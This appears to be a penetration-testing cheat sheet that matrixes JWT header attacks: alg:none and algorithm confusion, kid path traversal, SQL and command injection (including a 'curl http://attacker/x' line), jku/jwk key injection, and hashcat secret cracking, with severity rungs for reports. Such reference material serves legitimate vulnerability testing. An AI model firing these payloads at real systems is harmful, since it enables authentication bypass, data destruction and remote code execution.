# JWT — Header-by-Header Attack Matrix

Companion to `hunt-jwt-crypto`. That file covers the forgery primitives (alg:none, RS256→HS256
key confusion, kid/jku/jwk) and bespoke schemes. This file is the **compact header-attack matrix**:
every header field × the attack it enables, so you enumerate instead of guessing which header to jab.

## 1. The header field × attack table

| header | value you inject | effect if the verifier trusts it |
|---|---|---|
| `alg` | `none` (and case variants `None`/`NONE`/`nOnE`) | skip signature → edit payload → admin |
| `alg` | `HS256` on an RS256 token | key confusion (sign with the public key) |
| `alg` | `HS384`/`HS512`/`RS512`/`PS256` unexpected | algorithm confusion (verifier accepts a different one than the issuer uses) |
| `alg` | `ES256`→`HS256` / `EdDSA`→`HS256` | same confusion across curve families |
| `kid` | `../../dev/null` / absolute path | verifier loads HMAC key from a FILE → empty/known secret |
| `kid` | `' UNION SELECT ...` / `;id` | kid reaches SQLi / command injection / SSRF in the key lookup |
| `jku` | attacker host serving a `.well-known/jwks.json` | verifier fetches attacker public key |
| `x5u` | attacker host serving a cert | same as jku, cert flavour |
| `jwk` | embedded RSA public key you generated | self-signed key injection (sign with your private key) |
| `x5c` | attacker cert chain | same as x5u but embedded (no fetch) |
| `typ`/`cty` | `JWT` vs `JWE` vs `application/json` | parser confusion (verifier reads a different payload type) |
| `zip`/`deflate` | compressed payload | parser bugs / smuggling payloads past filters |
| `crit` | `["typ"]` | forces the verifier to treat `typ` as critical — parser confusion |
| `b64` (RFC 7797 unencoded) | `false` + payload as raw | unencoded-payload confusion |

## 2. alg matrix — try ALL of these, not just `none`+`HS256`

```
none / None / NONE / nOnE
HS256 HS384 HS512  (key confusion against public key of RS/ES/EdDSA)
RS256 RS384 RS512 PS256 PS384 PS512  (alg switch to one the verifier signs differently)
ES256 ES384 ES512  EdDSA  (curve confusion)
```
The bug is almost never "one alg is wrong" — it is "the verifier honours the token's own `alg`
and a differently-typed key is on hand". Enumerate the full set.

## 3. kid sink matrix (what a key-lookup by kid reaches)

| kid value | sink | impact |
|---|---|---|
| `../../../../../dev/null` | file read → empty HMAC secret | forge with empty secret |
| `../../etc/hostname` / `../../etc/passwd` | file read | key = file contents |
| `x'); DROP TABLE keys;--` | SQLi in key DB | data / key theft |
| `;curl http://attacker/x` | command injection in key script | RCE |
| `https://attacker/jwks` | SSRF key fetch | attacker key |
Rule: `kid` is attacker-controlled input into a lookup; if the lookup is not an allow-list, it
reaches a sink. Map the sink by reading the error (file-not-found vs DB error vs fetch timeout).

## 4. The two-request discrimination (already in main, restated tight)

```
A) tampered payload + ORIGINAL sig  → 401   (signature verified)
B) alg:none + empty sig             → 401   (alg:none rejected)
C) valid token, foreign object       → 403   (authn ok, authz fails)
```
A/B=401 while C=403 = signature is checked. A tampered token reaching the SAME 403 as C =
signature not verified → Critical.

## 5. Offline / secret-recovery ladder

```
rung 1  HS256 weak secret -> hashcat -m 16500 rockyou
rung 2  RS256 + n reuse across tokens -> rsa_sign2n recover modulus -> key confusion
rung 3  kid=fixed -> JWKS cache poisoning (serve your key under a cached kid)
rung 4  jku no allowlist -> serve your JWKS -> forge admin
```

## 6. Escalation rung

```
rung 1  token decodes + claims read        → recon (not a finding)
rung 2  expired token still accepted        → Medium (unless admin)
rung 3  forge own identity / another user   → High (unauth data read)
rung 4  forge ADMIN + reach admin action    → Critical
```
A forge that only loads `/my-account` is the *mechanism*; the finding is the admin objective.